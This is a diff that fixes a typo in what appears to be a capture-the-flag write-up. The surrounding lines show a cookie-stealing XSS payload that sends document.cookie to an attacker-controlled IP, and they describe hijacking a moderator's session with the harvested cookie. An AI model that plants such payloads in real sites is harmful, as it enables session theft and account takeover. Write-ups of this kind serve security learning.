@@ -30,7 +30,7 @@ Although there is a rudimentary WAF in place, circumventing it didn't take much.
 
 `<SCRIPT id=test>document.write('<img src="http://192.168.56.1/collect.gif?cookie=' + document.cookie + '" />')</SCRIPT>`
 
-All I needed on the backend was a simple little Python script to collect the cookies being sent to my IP address. My assumption was correct - the page was being periodically accessed by cooldude89, and I shortly harvested his cookie and used it to log in as him. Now as moderator, I was able to set my sights on a higher prized.
+All I needed on the backend was a simple little Python script to collect the cookies being sent to my IP address. My assumption was correct - the page was being periodically accessed by cooldude89, and I shortly harvested his cookie and used it to log in as him. Now as moderator, I was able to set my sights on a higher prize.
 
 ## Escalating from Moderator
 
